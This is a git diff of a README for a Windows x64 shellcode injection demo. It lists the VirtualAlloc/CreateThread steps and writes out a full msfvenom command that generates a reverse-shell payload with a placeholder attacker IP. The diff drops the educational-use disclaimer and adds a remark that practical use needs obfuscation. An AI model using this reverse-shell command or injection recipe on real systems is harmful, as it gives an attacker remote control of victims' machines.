@@ -1,7 +1,6 @@
 # Shellcode Injection - Windows x64
 
-
-This project demonstrates manual shellcode injection using C++ and Windows API.
+Demonstrating basic shell code injection using Windows API and C++. 
 
 ## 💻 Features
 - Manual shellcode allocation and execution
@@ -15,26 +14,20 @@ Shellcode generated using `msfvenom`:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP LPORT=PORT -f c
 ````
 
-> 🔐 Obfuscated with simple ROT13 (optional)
-
 ## 🧠 How it Works
 1. Allocate memory with `VirtualAlloc`
 2. Copy shellcode to allocated region
 3. Run with `CreateThread`
 
 ## 🖼️ Screenshots
-<p align="center>
-  ![Injection Demo](screenshot/analysis.png)
-</p>
 
+  ![Injection Demo](screenshot/analysis.png)
 
 ## 📁 File Structure
 
 * `main.cpp` — injection code
 * `shellcode.h` — contains unsigned char shellcode array
-* `msfvenom_command.txt` — command used for payload
 
-## ⚠️ Disclaimer
+## 📝 Note :
 
-This is for **educational** purposes only. Do not use for malicious activity.
-
+* This is just a basic shell code injection for demonstration purposes and will need appropriate obfuscation when in practical use.
